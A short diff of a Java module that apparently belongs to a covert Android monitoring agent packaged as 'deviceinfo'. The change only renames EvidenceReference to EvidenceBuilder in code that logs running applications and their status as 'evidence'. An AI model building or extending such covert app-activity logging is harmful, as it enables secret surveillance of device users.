@@ -17,7 +17,7 @@ import com.android.deviceinfo.ProcessInfo;
 import com.android.deviceinfo.ProcessStatus;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.interfaces.IncrementalLog;
 import com.android.deviceinfo.interfaces.Observer;
@@ -41,12 +41,12 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 
 	}
 
-	EvidenceReference logIncremental;
+	EvidenceBuilder logIncremental;
 
 	@Override
 	public void actualStart() {
 		// viene creato un file temporaneo di log application, aperto.
-		logIncremental = new EvidenceReference(EvidenceType.APPLICATION);
+		logIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
 		ListenerProcess.self().attach(this);
 	}
 
@@ -83,7 +83,7 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		items.add(WChar.getBytes(name, true));
 		items.add(WChar.getBytes(status.name(), true));
 		items.add(WChar.getBytes(module, true));
-		items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
+		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
@@ -104,7 +104,7 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		}
 		if (logIncremental.hasData()) {
 			logIncremental.close();
-			logIncremental = new EvidenceReference(EvidenceType.APPLICATION);
+			logIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
 		}
 	}
 
